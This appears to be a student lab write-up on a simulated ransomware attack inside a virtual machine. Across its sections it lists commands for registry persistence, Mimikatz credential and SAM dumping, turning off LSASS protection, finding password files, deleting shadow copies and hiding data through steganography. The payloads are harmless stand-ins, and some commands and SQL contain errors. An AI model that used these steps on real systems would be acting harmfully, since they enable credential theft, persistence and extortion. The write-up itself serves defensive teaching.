# Evidence Artefacts

## Overview

This document catalogues the evidence generated by the malicious actor who is implementing ransomware in the virtual machine system. Due to ethical and legal concerns, any malicious activity is either demonstrated illustratively or temporarily, as the point is to outline the common steps an attacker takes to aid companies in identifying and deterring these events. To find more detailed information about the attack stages, please look into the [attack phases](attack_phases.md) repository.

## Digital Evidence

### 1. Email and VBA macros

#### Artefacts Collected

- Original Email Message
  - Evidence highlights the social engineering tactics used on the sender. The sender is not from the official security email address that many companies would have. There is a threat within the text of account termination, creating fear and a deadline for the user to act upon. There is also a grammatical error ("WIng"). This is a common feature within most phishing scams.

<img width="3840" height="2160" alt="email" src="https://github.com/user-attachments/assets/4f77841c-7003-4339-860a-a44b675ded80" />


- Attachment Files
  - The image below shows a message box that appeared upon opening the document, alerting the user to the attack. In an unsimulated circumstance, this would not appear; instead, it would run malicious code in the background.

<img width="3840" height="2160" alt="initalattack" src="https://github.com/user-attachments/assets/811ebd7f-3380-4f8f-9371-e893405725f1" />

- Obfuscated Code
   - Below shows another output that was automatic upon opening the document. This was an obfuscated string that would be untraceable and unreadable. In real-world scenarios, after being translated, there would not be a pop-up; instead, it would give the malicious actor access to the secured network.

<img width="3840" height="2160" alt="malware" src="https://github.com/user-attachments/assets/2f76c252-deae-47cb-9c58-c651da4152a9" />

#### VBA Code
```
Option Explicit 'catches logical errors

Function Base64Decode(base64string As String) As String 'function to decode obfuscated code
    Dim xmlObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument.6.0") 'calls library
    Dim node As Object
    Set node = xmlObj.createElement("tmp") 'extracts the object
    node.DataType = "bin.base64"
    node.Text = base64string
    Dim byteData() As Byte
    byteData = node.nodeTypedValue 'changes data type to byte
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2 'adTypeText
    stream.Mode = 3 'adModeReadWrite
    stream.Open
    stream.WriteText StrConv(byteData, vbUnicode) 'converts bytes to unicode
    stream.Position = 0 'starts at the beginning
    stream.Type = 2
    Base64Decode = stream.ReadText 'returns decoded string to procedure
    stream.Close
    
End Function

Sub Document_Open() 'procedure will run once the document is opened
    MsgBox "This file contained malicious code. Your files are now under attack!", vbExclamation, "RANSOMWARE" 'opens a message box alerting the user that the code has run
    
    Dim encoded As String
    encoded = "bWFsd2FyZQ==" '"malware" after being obfuscated in base64
    Dim decoded As String
    decoded = Base64Decode(encoded) 'calls to function
    
    MsgBox decoded
End Sub
```
### 2. System Artifacts

#### Registry Evidence

- Run Key:
  - Upon a user logging on, the malware.exe will be initiated. This will allow any processes that may have been terminated from the computer shutdown to restart. Allows for persistence in the attack and disguises itself among official Windows tools. Below is the PowerShell code:

```
$MalwarePath = "C:\Users\Public\malware.exe" #defines where the malware is stored
$RegPath = "HKCU: \Software\Microsoft\Windows\CurrentVersion\Run" #directs to the registry key
$Name = "Updater" #name of the new registry key
Set-ItemProperty -Path $RegPath -Name $Name -Value $MalwarePath
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"/v Updater /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates the new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof of new registry key in registry editor" src="https://github.com/user-attachments/assets/3fd623a1-55e2-4255-9538-32e1f03c3a1a" />

- Logoff Key:
   - Although there is no standard key for logging off, an attacker can still manipulate the environment keys, which may not take effect until after a logoff or a restart of the session. Keys in the environment will be wiped after the session ends, but having a script that runs upon logging off can inject the malicious key once again, removing its volatility. Below is the PowerShell code to add a 'logoff' key:

```
$LogoffScript = "C:\Users\Public\malware.exe" #defines where the malware is located
Set-ItemProperty â€”Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $LogoffScript
reg add "HKCU\Software\Microsoft\CurrentVersion\Logoff" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof for logoff key" src="https://github.com/user-attachments/assets/e41192b9-4fb3-4b35-a19a-a79f37f7c01b" />

- Trap:
   - To ensure total persistence is achieved, the malware must be able to handle unexpected crashes and shutdowns. Below is the code that would restart the process upon meeting an unexpected situation using the Trap procedure:

```
trap #begins when an error is detected
{ Start-Process "C:\Users\Public\malware exe" #starts malware.exe process again
Continue } #continues to the next statement after the error
```

### 3. Credentials

#### LSASS Dumping

- Task Manager was used for the creation of this dump.
   - First, open the manager.
   - Then select a process you want to dump; in this case, Application Data was chosen.
   - Right-click the process and select Create Dump File.
   - A dialogue box will appear to showcase the dump, which can be viewed through an application such as Visual Studio (see below:).
 
<img width="3840" height="2160" alt="lss dump" src="https://github.com/user-attachments/assets/bc01f94e-c9f8-430c-9cda-87968d89f973" />

This dump showcases all of the modules on the system, their versions, and storage paths, allowing malicious users to understand the configuration of the system and slip malware into places that are not accessed regularly. 

#### Mimikatz

This application was downloaded from: https://github.com/ParrotSec/mimikatz/tree/master.

[Note: when downloading it, the system's security will flag the file as a virus and once run, it will be terminated and put into quarantine. Go to Virus & Threat Protection, the history where a list of quarantined items is available. You can then manually release the file to allow it to run. For a black-hat hacker to run this without this issue, they would use the obfuscation techniques as demonstrated in the previous phases.]

1. Password Extraction:

- Before any passwords can be harvested, the user's privileges are raised. This is done through raising their role to debug, giving them access to interact with other processes, no matter what level they are.

```
privilege::debug
```

  Output:

<img width="702" height="56" alt="image" src="https://github.com/user-attachments/assets/d17fa026-0820-4f5a-918b-07b40eda7a21" />

- After this is completed, a token with high-level access is impersonated, allowing for sensitive tasks to be completed.

```
token::elevate
```

  Output:

<img width="3714" height="571" alt="image" src="https://github.com/user-attachments/assets/5bb78e68-87e3-45bf-a7fc-4b0865e71b6c" />

- Now the passwords can be dumped using 'sekurlsa', which interacts with the LSASS to extract this information.

```
serkurlsa::logonpasswords
```

  Output: P@ssw0rd!

  (The short list is due to the simulation system having only one user. For a wider network in the real   world, the list would be longer, with much more exploitation possible.) 

2. SAM Dump:

- The Security Account Manager (SAM) is a database storing all of the usernames and password hashes for local accounts on a machine. Its legitimate purpose is to authenticate users who are logging onto the device. By using Mimikatz, this information can be used to obtain further privileged access to the system.

```
lsadump:sam
```

  Output:

<img width="3840" height="2160" alt="sam" src="https://github.com/user-attachments/assets/28adc5e4-8293-46b5-b353-ee8d848e0ccd" />

3. Location Finder:

- The command prompt can be used to search for files that contain strings, such as 'password', in their names, leading malicious actors to possible locations of credentials.

```
findstr /si password *.txt
findstr /si password *.xml *.ini *.txt #searches for files ending with .xml/.ini/.txt that contain 'password' in their name throughout all files on the system
```

<img width="3840" height="2160" alt="all partition files that conatin password" src="https://github.com/user-attachments/assets/4361ac6c-bfc4-41a8-959e-005630617db5" />

- Instead of just files, the directories, their corresponding files, and the date and time of creation can be found through the code below:

```
dir /s *pass* == *cred* == *vnc* == *.config* #searches through directories for files containing 'pass'/'cred'/'vnc' in its name
```

- This allows for malicious users to find the newest credentials that will be more useful for them than the older, potentially out-of-date information.

  Output: 

<img width="3840" height="2160" alt="location and password txt list" src="https://github.com/user-attachments/assets/d96a28c5-bf17-4e36-8386-75e21f25af48" />

4. Registry:

- In previous steps, the registry has been manipulated using the command prompt. However, in this case, it can be used to search for registry keys that store passwords for further credential access.

```
reg query HKLM /f password /t REG_SZ /s #searches top-level registry hive for entries that contain 'password', including subkeys
```

  Output: 

<img width="3840" height="2160" alt="registry passwords" src="https://github.com/user-attachments/assets/3098cd73-6c5d-44fe-8314-2c54a5304424" />


### 4. Network Exploration

#### Active Directory

- All users and groups in the domain were listed along with their paths for further mapping of the network topology to start exploration and lateral movement. The following code was entered into a PowerShell window using escalated privileges obtained by the previous phase.

- Users:
  ```
  [ADSI]WinNT://$env:USERDOMAIN" #connects to active directory using Active Directory Service Interfaces (ADSI)
  $domain = [ADSI]"WinNT://$env:USERDOMAIN" #environment variable that points to Windows domain
  $domain Children | Where-Object { $_.SchemaClassName -eq 'User' } #filters all objects for user accounts
  ```
  <img width="3840" height="2160" alt="list of all users on domain" src="https://github.com/user-attachments/assets/2ae30b19-9984-4d66-acc8-8a28d6a4fd05" />

- Groups:
  ```
  $domain.Children | Where-Object { $_.SchemaClassName -eq 'Group' } #filters all objects for group property
  ```
  <img width="3840" height="2160" alt="list of all groups on domain" src="https://github.com/user-attachments/assets/151d3cfb-b385-4053-ba39-e7b837437d13" />

#### Nmap Scanning

- Nmap must be installed, which can be done on Windows using this link - nmap.org/download. It is a free resource and is able to scan networks and create topologies for easy mapping and exploration. This helps in finding weak ports that can be easily exploited by the malware. The following code was entered into the command feature on the Nmap GUI.

- Ping Scan:
  ```
  nmap -sn 192.168.1.0/24 #sends probe packets and lists which hosts respond
  ```
  <img width="3840" height="2160" alt="ping scan, all hosts on subnet (nmap)" src="https://github.com/user-attachments/assets/60021945-1c51-440d-97b7-15d81afdd16e" />

- Range Scan:
  ```
  nmap 192.168.1.1-20 #attempts to find what ports/services are open
  ```
  <img width="3840" height="2160" alt="scanned a range of ports to find weak areas (netmap)" src="https://github.com/user-attachments/assets/c6e41e20-269e-4338-bffb-330cf3665cf7" />

- Common TCP Port Scan:
  ```
  nmap 192.168.1.10 #scan top 1000 most common TCP ports to determine what services are running
  ```
  <img width="3840" height="2160" alt="scanned 1000 most common ports (nmap)" src="https://github.com/user-attachments/assets/8aa1dad5-29b8-4ba2-9994-ffea178fbe87" />

- After making use of the scans listed above, Nmap will automatically create a network topology diagram. Below is the local network graph created for the workstation:
<img width="3840" height="2160" alt="local network topology mapped (nmap)" src="https://github.com/user-attachments/assets/f2087128-3fb8-4c86-bef4-c5db009eefac" />
  
#### Stolen Kerberos Ticket

- Kerberos tickets are part of the authentication protocol that verifies identities without the need for users to send passwords over the network multiple times. This decreases the chance of interception of packets with vital information and saves time for users as they are only required to log in once. However, by using Mimikatz, malicious actors can steal and even forge such tickets to send around the network, authenticating themselves without the need for a plaintext password.
  ```
  sekurlsa::minidump lsass.dump #a snapshot of the local security authority subsystem service (LSASS) is loaded
  sekurlsa::logonpasswords #extracts and displays Kerberos tickets from LSASS memory
  ```
  <img width="2205" height="357" alt="attempt to steal kerberos tickets (before turning off)" src="https://github.com/user-attachments/assets/27ebda62-a803-441c-bbda-f37149161987" />

- An error has occurred due to unprivileged access to memory. To fix this, a register must be removed from the Registry Editor. By going to Computer > HKEY-LOCAL-MACHINE > SYSTEM > CurrentControlSet > Control > Lsa, the 'RunAsPPL' register can be found with either a value of 1 or 2. Edit this number to be 0 to turn off, removing the additional protections enforced by Windows that restrict memory access. 

  <img width="3840" height="2160" alt="lsass protection is turned off by attacker " src="https://github.com/user-attachments/assets/2b1a5fd4-559f-4710-8200-6de0d460b2db" />

- Now we can run the following code:
(NOTE: There is still an error present, as there are no other logins on the virtual machine besides the current user.)
  ```
  privilege::debug
  sekurlsa::tickets
  ```
  <img width="3840" height="2160" alt="after restarting, success just no passwords to steal" src="https://github.com/user-attachments/assets/09feec23-de05-4747-b8e5-e0d86acb3efa" />


#### Pass-the-Hash

- By using previous codes from early phases with Mimikatz, a pass-the-hash log has been generated and is ready to be sent. This will allow the attacker to be authenticated in a remote system without access to a plaintext password.
  ```
  privilege::debug
  lsadump::sam
  ```
  <img width="3840" height="2160" alt="pass the hash" src="https://github.com/user-attachments/assets/5e478791-1c45-4901-b66d-89af71013c96" />

### 5. Collection and Exfiltration

#### Data Aggregation & Compression

1. Database Creation
   - By using DB Browser for SQLite (downloaded at https://sqlitebrowser.org/dl/), three tables were created to be used for data aggregation and compression in this phase. Databases are the primary method for storing information, as they are easy to read and connect through the use of primary and foreign keys. The table names and contents can be seen through the following SQL code:
     ```
     CREATE TABLE "Patient_Demographics" (
     "Patient_ID" INTEGER NOT NULL UNIQUE, #specifies what data input should be entered to ensure consistency within the database; in this case, the data should be a unique number, and this field cannot be left blank
     "Name" TEXT NOT NULL,
     "DoB" INTEGER NOT NULL,
     PRIMARY KEY("Patient_ID") #this is another way to specify data regulations, it automatically means the field cannot be left blank and must be unique
     );
     
     CREATE TABLE "Insurance" (
     "Patient_ID" INTEGER NOT NULL UNIQUE,
     "NHS_Number" INTEGER, #as this is a primary key, NOT NULL and UNIQUE do not need to be specified here
     PRIMARY KEY("NHS_Number")
     FOREIGN KEY("Patient_ID") REFERENCES "Patient_Demographics"("Patient_ID") #reinforces referential integrity as child row must reference existing parent row
     );

     CREATE TABLE "Diagnosis" (
     "Patient_ID" INTEGER,
     "Symptoms" TEXT,
     "Treatment" TEXT,
     PRIMARY KEY("Patient_ID")
     FOREIGN KEY("Patient_ID") REFERENCES "Patient_Demographics"("Patient_ID")
     );
     ```
  - After the tables are created, data must be added. This was done using the SQL code below:
  ```
  INSERT INTO Patient_Demographics (Patient_ID, DoB) VALUES ('98', 'Deberah Allisan', '04/15/1999'), ('53', 'Donald Richards', '09/12/1967'), ('82', 'Drew Crawley', '10/11/2003');
  INSERT INTO Insurance (Patient_ID, NHS_Number) VALUES ('98', '28456058'), ('53', '47192834'), ('37482917');
  INSERT INTO Diagnosis (Patient_ID, Symptoms, Treatment) VALUES ('98', 'High body temperature', 'IV'), ('53', 'Sprained right knee', 'Wrap and crutches'), ('82', 'Dizzy spells', 'Bed rest until advised');
  ```

<img width="3840" height="2160" alt="tables with data" src="https://github.com/user-attachments/assets/1b696399-00c4-4d45-982c-8d950ef20f6c" />

2. Database Aggregation
   - Inner Join is used to combine the two most needed tables, Patient_Demographics and Insurance. These tables contain the most confidential data, which could be used for future attacks through fraud, theft, or spear-phishing to spread more ransomware, thereby repeating this cycle. The following SQL code shows how to combine the two tables:
     ```
     SELECT * #selects all fields
     FROM Patient_Demographics
     INNER JOIN Insurance #returns results from two tables that share a matching value
     USING (Patient_ID); #will only show the Patient_ID field once, bridges both tables with this value
     ```
  - The results were then exported as a CSV file, saved under 'data_agg', ready for compression and transfer.

<img width="3840" height="2160" alt="join results" src="https://github.com/user-attachments/assets/dee0c5ea-2597-439a-aeaa-ca53b6979862" />


3. Compression
   - There are three methods that can be used:
     - ZIP = Universally supported, examines each file individually to determine the most efficient way to compress it. This allows for different compression methods to be used on data in a single file to improve speed.
     - 7z = Removes redundancy in the structure. This increases the threat of file corruption as one failed data packet will lead to the chain being broken and unrecoverable. It has no recovery mechanisms built within it and is not widely used.
     -  TAR = Originally used for magnetic tape drive storage and is used for Unix systems, as it preserves file permissions.
   - The file will be compressed using ZIP, as it is universally supported and will allow for easier transportation, as it will not stand out as much as other compressed files. Also, there is less of a risk for data loss, which will cause severe issues for the attacker, as having to retry the phase several times increases the risk of being detected and mitigated before the final phase.

<img width="3840" height="2160" alt="compressed file" src="https://github.com/user-attachments/assets/903e5dc0-ffd9-45f2-992e-a56e6e8152e1" />

  
#### Steganography

- Using Steganography Online, a free resource found on GitHub (https://stylesuxx.github.io/steganography/), the aggregated dataset, generated above, was encoded into an image of the NHS logo. This will make transportation out of the server less risky for the attacker, as many emails contain this logo at the bottom, or are included within several data packet transfers as a signature.
- Below shows the confidential data being encoded using the Least Significant Bit method:
  
<img width="3840" height="2160" alt="steg encode" src="https://github.com/user-attachments/assets/e0d7ec0a-6371-4c08-9095-0e33f9fb0693" />

- Below are the images before being encoded (on the left) and after (on the right). There is no obvious difference to be detected by the human eye between these two images.

<img width="3840" height="2160" alt="before and after images (after is on right)" src="https://github.com/user-attachments/assets/f630bdae-3318-4be9-b003-ec4b92695e5b" />

### 6. Ransomware Initiated

#### Preparation

1. Security Disabling

- Antivirus services are deactivated through the Virus & Threat Protection settings inside the Windows Security App. Real-time protection is turned off, blocking the detection of malware installation and allowing it to run. This is only a short-term effect, as it will be configured back on once the computer is restarted. Therefore, this step should be taken immediately before malware deployment to ensure the setting remains off.

(insert evidence)

2. Shadow Copy Deletion

- To delete all shadow copies on the system, the following code should be run on an Admin-level Command Prompt:

```
vssadmin delete shadows /all #Volume Shadow Copy Service Administrative is called on to delete shadows with a flag specifying all to be removed
```

- Below are the results. Please note that there are no items listed, as there were no shadow copies created for the Virtual Machine. Normally, a list of copies will be shown, including the path where it was saved.

(insert evidence)

- This can also be done through Disk Cleanup. First, click on 'clean up system files'.

(insert pic)

- Then go to the 'more options' tab after the scan has completed. Once there, select the 'clean up' option under 'system restore and shadow copies' to delete all backups on the system.

(insert pics)

3. Backup Destruction

- Through the Control Panel > System and Security> System > System Protection, restore points can be configured to disable and delete any existing backups.

(insert pic)

#### Execution

- Through Visual Studios, using the Python language, the following code was executed to simulate the locking of files and creating a ransom note.

(update code and add comments!!)
import os

// Directory to 'lock' files in (choose a harmless test folder!)
target_dir = "C:/Users/YourUser/Desktop/testfolder"

for filename in os.listdir(target_dir):
    file_path = os.path.join(target_dir, filename)
    if os.path.isfile(file_path):
        # Simulate locking by renaming the file
        os.rename(file_path, file_path + ".locked")

// Create a ransom note
with open(os.path.join(target_dir, "README_RESTORE_FILES.txt"), "w") as f:
    f.write("Your files have been 'locked'. This is a simulation for educational purposes.\nNo data has been harmed.\n")

(add pic of result)

- The ransom note was created by studying several previous instances collected in a database on Group-IB (https://www.group-ib.com/resources/ransomware-notes/). All of the notes inform the user about what has happened, the group responsible, and that they are the only ones who can help unlock the files. Additionally, the notes outline the rules governing how the victims should proceed to ensure cooperation. These range in length and style of language, some friendly addressing to "friends" or formal, such as "Dear Management". Each will have different psychological effects. A more friendly approach might be trying to gain trust with the users for easier cooperation. The other approach might go with fear tactics, marking themselves as a threat to be taken seriously. The tactic used in this study was a threatening tone to induce panic, preying on quick, illogical decisions for financial gain. 

(add ransom note pic)
